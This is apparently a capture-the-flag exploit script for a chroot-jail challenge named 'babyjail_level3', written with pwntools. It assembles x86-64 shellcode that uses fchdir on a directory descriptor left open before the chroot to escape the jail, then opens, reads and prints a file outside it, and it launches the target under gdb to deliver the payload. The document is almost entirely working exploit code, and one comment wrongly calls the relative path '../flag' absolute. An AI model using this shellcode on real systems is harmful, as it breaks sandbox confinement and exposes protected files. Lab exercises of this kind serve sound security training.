#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

binary_path = './babyjail_level3'  # Adjust as needed

shellcode = asm('''
    /* fchdir to the directory we opened before chroot */
    mov rax, 81        /* SYS_fchdir */
    mov rdi, 3         /* File descriptor is likely 3 */
    syscall
    
    /* Open the flag file using absolute path */
    mov rax, 2         /* SYS_open */
    lea rdi, [rip+flag_path]
    xor rsi, rsi       /* O_RDONLY */
    xor rdx, rdx
    syscall
    
    /* Save flag fd */
    mov rbx, rax
    
    /* Read the flag content */
    xor rax, rax       /* SYS_read */
    mov rdi, rbx       /* Flag fd */
    lea rsi, [rip+buffer]
    mov rdx, 100       /* Read up to 100 bytes */
    syscall
    
    /* Save number of bytes read */
    mov r12, rax
    
    /* Write flag to stdout */
    mov rax, 1         /* SYS_write */
    mov rdi, 1         /* stdout */
    lea rsi, [rip+buffer]
    mov rdx, r12       /* Bytes read */
    syscall
    
    /* Exit */
    mov rax, 60        /* SYS_exit */
    xor rdi, rdi
    syscall

flag_path:
    .string "../flag"    /* Absolute path to flag */
buffer:
    .space 100
''')

s = '''
b * main
'''

p = process([binary_path, '/etc'])  # Open /etc directory

gdb.attach(p, s)
p.send(shellcode)

p.interactive()
